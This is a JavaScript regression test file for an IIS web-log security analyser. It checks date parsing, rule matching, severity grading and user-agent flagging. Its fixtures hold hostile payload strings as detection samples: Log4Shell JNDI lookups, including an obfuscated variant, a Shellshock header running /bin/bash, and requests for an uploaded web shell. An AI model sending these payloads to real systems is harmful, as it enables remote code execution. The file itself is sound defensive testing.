/* Regression checks for the fixes made after the 2026-10-03 peer review (run with: node test/regression-review.js).
 * Each check prints PASS/FAIL; exit code 1 if any check fails. Fixtures are written to the OS temp folder. */
'use strict';
var NS = require('./node-harness.js'), U = NS.util, fs = require('fs'), path = require('path'), os = require('os');
var settings = NS.defaultSettings(), lists = NS.loadLists();
var rulesText = fs.readFileSync(path.join(__dirname, '..', 'rules', 'default-rules.json'), 'utf8');
var ruleset = NS.rules.loadRuleset(rulesText);
var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'iisla-reg-')), failures = 0;
function check(name, ok, detail) { console.log((ok ? 'PASS ' : 'FAIL ') + name + (detail ? ' - ' + detail : '')); if (!ok) { failures++; } }

// 1. rule: wildcards test each rule id of the row, not the joined hit string
(function () {
  var fn = NS.filter.compile(NS.filter.parse('rule:R-EXP-*', 0)), fn2 = NS.filter.compile(NS.filter.parse('rule:R-SCAN-00?', 0));
  check('rule wildcard, hit listed second', fn({ hits: function () { return 'R-SCAN-002,R-EXP-001'; } }) === true);
  check('rule wildcard, no matching id', fn({ hits: function () { return 'R-SCAN-002,R-WS-004'; } }) === false);
  check('rule ? wildcard, no false positive across ids', fn2({ hits: function () { return 'R-SCAN-010,R-EXP-001'; } }) === false);
}());

// 2. impossible dates and junk after the time are malformed rows in both directions of the parser
(function () {
  var row = NS.parser.newRow(), fp = new NS.parser.FileParser(0);
  fp.line('#Fields: date time c-ip cs-method cs-uri-stem sc-status', row);
  var cases = [['2026-02-31 00:00:00', 2], ['2025-02-29 00:00:00', 2], ['2024-02-29 23:59:59', 1], ['2026-13-01 00:00:00', 2], ['0026-01-01 00:00:00', 2],
    ['2026-01-01 12:00:60', 2], ['2026-01-01 12:00:00Z', 2], ['2026-01-01 1a:00:00', 2], ['2026-01-01 12:00:00.125', 1], ['2026-1-01 12:00:00', 2]];
  cases.forEach(function (c) { var code = fp.line(c[0] + ' 8.8.8.8 GET / 200', row); check('date ' + c[0], code === c[1], 'code ' + code); });
}());

// 3. the rule-set fingerprint covers which rules are enabled
(function () {
  var a = NS.rules.loadRuleset(rulesText), b = NS.rules.loadRuleset(rulesText, { 'R-SCAN-007': false });
  check('fingerprint changes when a rule is disabled', a.hash !== b.hash, a.hash + ' vs ' + b.hash);
  check('disabled rules listed', b.disabledIds.indexOf('R-SCAN-007') >= 0);
}());

// 4. a file that cannot be opened is reported, never silently dropped
(function (next) {
  var dir = path.join(tmp, 'W3SVC1'); fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, 'u_ex260101.log'), '#Fields: date time c-ip cs-method cs-uri-stem sc-status\r\n2026-01-01 00:00:01 8.8.8.8 GET /a 200\r\n');
  var site = NS.io.discover(dir, 0).sites[0];
  site.files.push(U.extend({}, site.files[0], { name: 'u_ex260102.log', path: path.join(dir, 'u_ex260102.log') })); // listed but missing
  NS.store.load({ site: site, fileIds: [0, 1], settings: settings, ruleset: ruleset, lists: lists, maxRows: 100, keepRaw: true }, function (err, st) {
    check('unreadable file recorded', !err && st.incomplete === true && st.failed.length === 1 && st.failed[0].name === 'u_ex260102.log', JSON.stringify(st.failed));
    check('readable file still loaded', st.n === 1);
    next();
  });
}(function () {
  // 5. eviction backoff: a cap filled with protected entries does not trigger a sweep for every new key
  var site = NS.io.discover(path.join(tmp, 'W3SVC1'), 0).sites[0];
  var sc = new NS.scan.Scanner({ site: site, settings: U.extend({}, settings, { indexCaps: { ips: 100, stems: 100, uas: 100 } }), ruleset: ruleset, lists: lists });
  var sweeps = 0, orig = sc.evictStems; sc.evictStems = function () { sweeps++; return orig.call(this); };
  var row = NS.parser.newRow(), fp = new NS.parser.FileParser(0), i, frec = sc.idx.files[0];
  U.extend(frec, { rows: 0, malformedSamples: [], backSamples: [], s500: [], firstTs: 0, minTs: 0, maxTs: 0, lastTs: 0, nonAscii: 0, decodeErr: 0, backSteps: 0 });
  fp.line('#Fields: date time c-ip cs-method cs-uri-stem sc-status', row);
  for (i = 0; i < 400; i++) { fp.line('2026-01-01 00:00:01 10.0.0.1 GET /p' + i + '.aspx 200', row); sc.row(row, frec); } // successful executable paths are protected
  check('stem cap exceeded only with protected entries', sc.counts.stems === 400, 'stems ' + sc.counts.stems);
  check('eviction sweeps bounded by backoff', sweeps <= 31, sweeps + ' sweeps for 300 inserts over the cap');

  // 6. fast-engine watchdog: unchanged progress ends the wait after the stall limit (fake clock)
  var E = NS.engine, oldNow = Date.now, oldTimeout = global.setTimeout, oldFso = U.fso, oldShell = U.shell, oldInstall = E.install, oldJob = E.buildJob, oldEnsure = U.ensureFolder, oldRead = U.readTextAnsi;
  var now = 1000, pending = null, result = null;
  try {
    Date.now = function () { return now; };
    global.setTimeout = function (cb) { pending = cb; };
    U.fso = function () { return { CreateTextFile: function () { return { Write: function () { }, Close: function () { } }; }, FileExists: function (p) { return /progress\.json$/.test(p); }, DeleteFile: function () { } }; };
    U.shell = function () { return { Run: function () { } }; }; U.ensureFolder = function () { };
    U.readTextAnsi = function () { return '{"rows":1,"bytesDone":1,"bytesTotal":100}'; };
    E.install = function () { return 'mock.ps1'; };
    E.buildJob = function (o) { return { output: o.output, progress: o.progress, cancel: o.cancel }; };
    E.run({ files: [] }, tmp, null, function (err) { result = err; });
    for (i = 0; i < 6 && pending; i++) { now += 3 * 60000; var cb = pending; pending = null; cb(); }
  } finally {
    Date.now = oldNow; global.setTimeout = oldTimeout; U.fso = oldFso; U.shell = oldShell; E.install = oldInstall; E.buildJob = oldJob; U.ensureFolder = oldEnsure; U.readTextAnsi = oldRead;
  }
  check('stalled fast engine ends with an error', !!result && /no progress/.test(result.message), result ? result.message : 'still waiting');

  // 7. outcome grading (1.3.0): failed requests drop to low, 2xx/5xx keep the rule severity, 3xx drops one level
  var G = NS.rules.gradeSev;
  check('grade 404 high -> low', G('high', 404) === 'low');
  check('grade 200 high stays', G('high', 200) === 'high');
  check('grade 500 high stays', G('high', 500) === 'high');
  check('grade 302 high -> medium', G('high', 302) === 'medium');
  check('grade status not logged unchanged', G('high', -1) === 'high');
  check('grade info stays info', G('info', 404) === 'info');
  (function () {
    var ev = new NS.rules.Evaluator(ruleset, new NS.parser.Deriver(lists)), row = NS.parser.newRow(), fp = new NS.parser.FileParser(0);
    fp.line('#Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status', row);
    fp.line('2026-01-01 00:00:01 203.0.113.9 GET /uploads/shell.php - 404', row); ev.evaluate(row);
    var i404 = ev.hits.slice(0, ev.n).indexOf('R-WS-004'), s404 = i404 >= 0 ? ev.hitSev[i404] : '';
    fp.line('2026-01-01 00:00:02 203.0.113.9 GET /uploads/shell.php - 200', row); ev.evaluate(row);
    var i200 = ev.hits.slice(0, ev.n).indexOf('R-WS-004'), s200 = i200 >= 0 ? ev.hitSev[i200] : '';
    check('R-WS-004 on a 404 graded low', s404 === 'low', s404);
    check('R-WS-004 on a 200 stays high', s200 === 'high', s200);
    check('hitSevString parallels hitString', ev.hitSevString().split(',').length === ev.hitString().split(',').length);
  }());

  // 8. user agents (1.4.0): parsing, age at the time of the request, flags, filters, rules, index eviction
  (function () {
    var UA = NS.useragent, F = NS.filter, ts = Date.UTC(2026, 2, 10), DAY = 86400000;
    function fl(s, t) { return UA.at(UA.info(s), t || ts).flags.join(','); }
    check('UA release table loaded', UA.loaded);
    check('UA listed release date', UA.fmtDate(UA.release('chrome', 120).ms) === '2023-12-05');
    var mid = UA.release('chrome', 121), ext = UA.release('chrome', 150);
    check('UA interpolated release between listed versions', mid.est === 1 && mid.ms > Date.UTC(2023, 11, 5) && mid.ms < Date.UTC(2024, 1, 20));
    check('UA extrapolated release after the last listed version', ext.est === 2 && ext.ms > Date.UTC(2026, 3, 1));
    check('UA current Chrome not flagged', fl('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36') === '');
    check('UA same Chrome stale two years later', fl('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36', ts + 730 * DAY) === 'stale');
    check('UA Chrome 114 on Windows 7 impossible', fl('Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36') === 'stale,eol-os,impossible');
    check('UA Chrome 109 on Windows 7 possible', fl('Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36').indexOf('impossible') < 0);
    check('UA future version impossible', fl('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/170.0.0.0 Safari/537.36') === 'impossible');
    check('UA Windows NT 11.0 impossible', /impossible/.test(fl('Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36')));
    check('UA IE11 via Trident, compatibility view', UA.info('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0)').name === 'Internet Explorer 11');
    check('UA MSIE without Trident on Windows 10 impossible', /impossible/.test(fl('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)')));
    check('UA IE6 on XP stale, eol, eol-os', fl('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)') === 'stale,eol,eol-os');
    check('UA Office client not a browser', UA.info('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Trident/7.0; ms-office; MSOffice 16)').browser === 'office');
    check('UA EdgeHTML recognised', UA.info('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363').browser === 'edge-legacy');
    check('UA Edge uses the Chrome token', UA.info('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0').name === 'Edge 140');
    check('UA Safari on Windows after 5.1 impossible', /impossible/.test(fl('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15')));
    check('UA malformed brackets and Mozilla token', fl('Mozila/5.0 (Windows NT 10.0') === 'malformed');
    check('UA Chrome version not four-part malformed', /malformed/.test(fl('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144 Safari/537.36')));
    check('UA headless', fl('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36') === 'headless');
    check('UA Log4Shell inject', fl('${jndi:ldap://198.51.100.1/a}') === 'inject' && fl('${${::-j}ndi:ldap://x/a}') === 'inject');
    check('UA Shellshock inject', fl('() { :; }; /bin/bash -c id') === 'inject');
    check('UA library string not flagged', fl('python-requests/2.31.0') === '');
    var D = new NS.parser.Deriver(lists);
    check('deriver inject flag', D.ua('${jndi:ldap://x/a}').inject === true && D.ua('Mozilla/5.0+(Windows+NT+10.0)').inject === false);
    // quick filter: exact values with spaces, the pivot filter, uaflag / uaage / browser
    var q1 = F.parse('ua:="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"', 0).conds, q2 = F.parse('-stem:="/a b.aspx" stem:^"/x y"', 0).conds;
    check('filter ua:="..." keeps spaces', q1.length === 1 && q1[0].op === 'eq' && q1[0].v[0] === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    check('filter -stem:="..." and stem:^"..."', q2.length === 2 && q2[0].neg && q2[0].v[0] === '/a b.aspx' && q2[1].op === 'starts' && q2[1].v[0] === '/x y');
    function acc(dec, t) { var ui = D.ua(dec.replace(/ /g, '+')); return { ts: function () { return t || ts; }, ui: function () { return ui; }, ua: function () { return dec.replace(/ /g, '+'); } }; }
    function run(q, a) { return F.compile(F.parse(q, 0), { index: { uas: {} } })(a); }
    var old = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)', cur = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36';
    check('filter uaflag:eol', run('uaflag:eol', acc(old)) === true && run('uaflag:eol', acc(cur)) === false);
    check('filter uaflag:any / -uaflag:any', run('uaflag:any', acc(old)) === true && run('-uaflag:any', acc(cur)) === true);
    check('filter uaage ranges', run('uaage:>365', acc(old)) === true && run('uaage:<100', acc(cur)) === true && run('uaage:>365', acc(cur)) === false);
    check('filter uaage survives JSON', JSON.parse(JSON.stringify(F.parse('uaage:>365', 0))).conds[0].v[1] === 1e9);
    check('filter browser:ie', run('browser:ie', acc(old)) === true && run('browser:ie', acc(cur)) === false);
    check('filter uaflag:rare uses the index (missing = evicted = rare)', run('uaflag:rare', acc(cur)) === true);
    var bad = ''; try { F.parse('uaflag:bogus', 0); } catch (e) { bad = e.message; }
    check('filter unknown uaflag rejected', /Unknown user-agent flag/.test(bad));
    // rules: R-UA-003 row rule, R-UA-001 / R-UA-002 aggregate findings
    var ev = new NS.rules.Evaluator(ruleset, D), row = NS.parser.newRow(), fp = new NS.parser.FileParser(0);
    fp.line('#Fields: date time c-ip cs-method cs-uri-stem cs(User-Agent) sc-status', row);
    fp.line('2026-01-01 00:00:01 203.0.113.9 GET / ${jndi:ldap://x/a} 302', row); ev.evaluate(row);
    check('R-UA-003 on a Log4Shell user agent', ev.hits.slice(0, ev.n).indexOf('R-UA-003') >= 0);
    var spoof = 'Mozilla/5.0+(Windows+NT+6.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/114.0.0.0+Safari/537.36';
    var idx = { uas: {}, ips: {}, stems: {}, ruleHits: {}, files: [], totals: { firstTs: ts }, perDay: {}, restarts: [], gaps: [], schemas: [], softwares: {}, missingFiles: [], lbKeys: {} };
    idx.uas[spoof] = { n: 425, first: ts, last: ts + 600000, fFile: 0, fLine: 5, fIp: '203.0.113.45', ips: { '203.0.113.45': 1 }, ipN: 1, ipOv: 0, pubN: 1, fam: 'chrome', s2: 424, s3: 1, s4: 0, s5: 0, post: 422, exec: 425, xok: 424, hits: 0 };
    var out = [], en = function (id) { var r = ruleset.byId[id]; return r && r.enabled ? r : null; }, pr = function (id, k, d) { var r = ruleset.byId[id]; return r && r.params && r.params[k] !== undefined ? r.params[k] : d; };
    NS.scan.uaFindings(idx, out, en, pr);
    var f1 = out.filter(function (f) { return f.ruleId === 'R-UA-001'; })[0], f2 = out.filter(function (f) { return f.ruleId === 'R-UA-002'; })[0];
    check('R-UA-001 outdated browser reaching executable handlers', !!f1 && f1.entity === 'ua' && f1.severity === 'low', f1 ? f1.detail : 'none');
    check('R-UA-002 impossible user agent escalated by public 2xx', !!f2 && f2.severity === 'medium', f2 ? f2.detail : 'none');
    idx.uas[spoof].xok = 0; out = []; NS.scan.uaFindings(idx, out, en, pr);
    check('R-UA-001 needs public 2xx from executable handlers', !out.some(function (f) { return f.ruleId === 'R-UA-001'; }));
    check('R-UA-002 low without executable successes', out.some(function (f) { return f.ruleId === 'R-UA-002' && f.severity === 'low'; }));
    // index: user agents with rule hits survive eviction
    var site = NS.io.discover(path.join(tmp, 'W3SVC1'), 0).sites[0];
    var sc = new NS.scan.Scanner({ site: site, settings: U.extend({}, settings, { indexCaps: { ips: 1000, stems: 1000, uas: 50 } }), ruleset: ruleset, lists: lists });
    var frec = sc.idx.files[0], r2 = NS.parser.newRow(), fp2 = new NS.parser.FileParser(0), i;
    U.extend(frec, { rows: 0, malformedSamples: [], backSamples: [], s500: [], firstTs: 0, minTs: 0, maxTs: 0, lastTs: 0, nonAscii: 0, decodeErr: 0, backSteps: 0 });
    fp2.line('#Fields: date time c-ip cs-method cs-uri-stem cs(User-Agent) sc-status', r2);
    fp2.line('2026-01-01 00:00:00 203.0.113.7 GET / ${jndi:ldap://x/a} 302', r2); sc.row(r2, frec);
    for (i = 0; i < 200; i++) { fp2.line('2026-01-01 00:00:01 10.0.0.1 GET /portal/page.aspx agent-' + i + ' 200', r2); sc.row(r2, frec); }
    check('UA with rule hits kept at the index cap', !!sc.idx.uas['${jndi:ldap://x/a}'] && sc.idx.caps.uaEvicted > 0, 'evicted ' + sc.idx.caps.uaEvicted);
    // 9. finding examples (1.4.1): pointers carry status and graded severity; 2xx/5xx hits first; kept past the caps
    var pk = [[0, 1, 1, 'a', 'r1', 404, 'low'], [0, 2, 2, 'a', 'r2', 404, 'low'], [0, 3, 3, 'b', 'r3', 200, 'high'], [0, 4, 4, 'a', 'r4', 302, 'medium'], [0, 5, 5, 'a', 'r5', 500, 'high']];
    var pe = NS.scan.pickExamples(pk, 'high');
    check('examples: 2xx/5xx first, then by hit severity, log order within a rank', pe.map(function (x) { return x[1]; }).join(',') === '3,5,4,1,2', pe.map(function (x) { return x[1]; }).join(','));
    check('examples: one client only', NS.scan.pickExamples(pk, 'high', 'a').map(function (x) { return x[1]; }).join(',') === '5,4,1,2');
    var sc2 = new NS.scan.Scanner({ site: site, settings: U.extend({}, settings, { ruleHitRetention: 300 }), ruleset: ruleset, lists: lists });
    var fr2 = sc2.idx.files[0], r3 = NS.parser.newRow(), fp3 = new NS.parser.FileParser(0);
    U.extend(fr2, { rows: 0, malformedSamples: [], backSamples: [], s500: [], firstTs: 0, minTs: 0, maxTs: 0, lastTs: 0, nonAscii: 0, decodeErr: 0, backSteps: 0 });
    fp3.line('#Fields: date time c-ip cs-method cs-uri-stem sc-status', r3);
    for (i = 0; i < 400; i++) { fp3.line('2026-01-01 00:00:01 203.0.113.8 GET /uploads/shell.php 404', r3); sc2.row(r3, fr2); }
    fp3.line('2026-01-01 00:00:02 203.0.113.8 GET /uploads/shell.php 200', r3); sc2.row(r3, fr2);
    var hk = sc2.idx.ruleHits['R-WS-004'], last = hk.kept[hk.kept.length - 1];
    check('successful hit kept beyond the retention cap', hk.kept.length === 301 && last[5] === 200 && last[6] === 'high' && hk.xs === 1, 'kept ' + hk.kept.length);
    check('successful hit keeps its raw line beyond the first 200', !!last[4] && hk.kept[250][4] === '' && hk.sr === 1);
    var fw = NS.scan.buildFindings(sc2.idx, ruleset, settings).filter(function (f) { return f.ruleId === 'R-WS-004' && f.entity === 'rows'; })[0];
    check('finding shows the 200 as its first example', !!fw && fw.severity === 'high' && fw.examples[0][5] === 200 && fw.examples.length === 20);
    check('UA record has status mix and first occurrence', sc.idx.uas['${jndi:ldap://x/a}'].s3 === 1 && sc.idx.uas['${jndi:ldap://x/a}'].hits === 1 && sc.idx.uas['${jndi:ldap://x/a}'].fIp === '203.0.113.7');
  }());
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log(failures ? failures + ' CHECK(S) FAILED' : 'ALL CHECKS PASSED');
  process.exit(failures ? 1 : 0);
}));
